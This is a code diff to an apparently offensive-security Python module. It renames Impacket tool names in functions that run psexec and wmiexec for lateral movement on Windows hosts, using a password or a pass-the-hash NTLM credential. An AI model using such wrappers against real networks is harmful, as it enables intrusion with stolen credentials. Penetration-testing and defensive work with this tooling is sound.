@@ -69,7 +69,7 @@ def psexec_lateral_movement(
         ... )
 
     Tools Used:
-        - impacket-psexec (Linux)
+        - psexec.py (Linux)
         - psexec.py from Impacket suite
     """
     results = {
@@ -85,11 +85,11 @@ def psexec_lateral_movement(
         # Build psexec command
         if ntlm_hash:
             # Pass-the-hash
-            cmd = ["impacket-psexec", "-hashes", ntlm_hash]
+            cmd = ["psexec.py", "-hashes", ntlm_hash]
             results["method"] = "pass-the-hash"
         elif password:
             # Password authentication
-            cmd = ["impacket-psexec"]
+            cmd = ["psexec.py"]
             results["method"] = "password"
         else:
             results["error"] = "Either password or ntlm_hash required"
@@ -118,7 +118,7 @@ def psexec_lateral_movement(
         results["success"] = True
 
     except FileNotFoundError:
-        results["error"] = "impacket-psexec not found - install with: apt-get install impacket-scripts"
+        results["error"] = "psexec.py not found - install with: apt-get install impacket-scripts"
     except subprocess.TimeoutExpired:
         results["error"] = "Command execution timed out"
     except Exception as e:
@@ -161,7 +161,7 @@ def wmi_lateral_movement(
         ... )
 
     Tools Used:
-        - impacket-wmiexec
+        - wmiexec.py
     """
     results = {
         "execution_success": False,
@@ -175,9 +175,9 @@ def wmi_lateral_movement(
     try:
         # Build wmiexec command
         if ntlm_hash:
-            cmd = ["impacket-wmiexec", "-hashes", ntlm_hash]
+            cmd = ["wmiexec.py", "-hashes", ntlm_hash]
         elif password:
-            cmd = ["impacket-wmiexec"]
+            cmd = ["wmiexec.py"]
         else:
             results["error"] = "Either password or ntlm_hash required"
             return results
@@ -205,7 +205,7 @@ def wmi_lateral_movement(
         results["success"] = True
 
     except FileNotFoundError:
-        results["error"] = "impacket-wmiexec not found - install impacket-scripts"
+        results["error"] = "wmiexec.py not found - install impacket-scripts"
     except Exception as e:
         results["error"] = str(e)
 
